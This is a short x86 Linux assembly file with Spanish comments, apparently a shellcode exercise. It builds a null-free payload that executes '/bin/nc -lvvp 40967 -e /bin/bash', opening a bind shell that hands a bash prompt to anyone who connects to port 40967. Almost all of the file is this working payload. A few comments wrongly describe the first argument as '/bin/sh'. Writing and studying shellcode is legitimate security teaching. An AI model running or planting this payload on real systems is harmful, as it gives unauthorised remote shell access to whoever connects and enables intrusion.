	;; prog3.asm
	global _start
	section .text

_start:
	jmp dir_cadena
codigo:
	pop esi			;almacena en el registro ESI, el valor inicial de la pila

	xor eax,eax	    ;EAX=0
	mov byte[esi+7],al	;Fin de cadena de '/bin/sh'
	mov byte[esi+13],al	;Fin de cadena de '-lvvp'
	mov byte[esi+19],al	;Fin de cadena de '40967'
	mov byte[esi+22],al	;Fin de cadena de '-e'
	mov byte[esi+32],al	;Fin de cadena de '/bin/bash'
	mov dword[esi+53],eax	;Fin del arreglo de apuntadores a cadena (2do parametro de la syscall execve)
	
	mov byte[esi+67],al	;Fin de cadena de '/bin/bash'
	mov dword[esi+72],eax	;Fin del arreglo de apuntadores a cadena (2do parametro de la syscall execve)

	lea ebx,[esi]		;
	mov [esi+33],ebx	;Guarda la direccion del primer parametro (/bin/sh)
	lea ebx,[esi+8]
	mov [esi+37],ebx	;Guarda la direccion del segundo parametro (-lvvp)
	lea ebx,[esi+14]
	mov [esi+41],ebx	;Guarda la direccion del tercer parametro (40967)
	lea ebx,[esi+20]
	mov [esi+45],ebx	;Guarda la direccion del tercer parametro (-e)
	lea ebx,[esi+23]
	mov [esi+49],ebx	;Guarda la direccion del tercer parametro (-/bin/sh)

	lea ebx,[esi+57]
	mov [esi+68],ebx	;Guarda la direccion del tercer parametro (-/bin/sh)

	
	lea ebx,[esi]
	lea ecx,[esi+33]	;Aqui empieza el arreglo de parametros
	lea edx,[esi+68]	;EDX tiene la direccion donde esta almacenado el valor 000
	mov al,0xb		;syscall execve
	int 0x80
	
dir_cadena:	
	call codigo		;guarda la direccion inicial de la cadena en la pila
	db '/bin/ncZ-lvvpZ40967Z-eZ/bin/bashZXXXXXXXXXXXXXXXXXXXXYYYYTERM=linuxZXXXXYYYY'
	
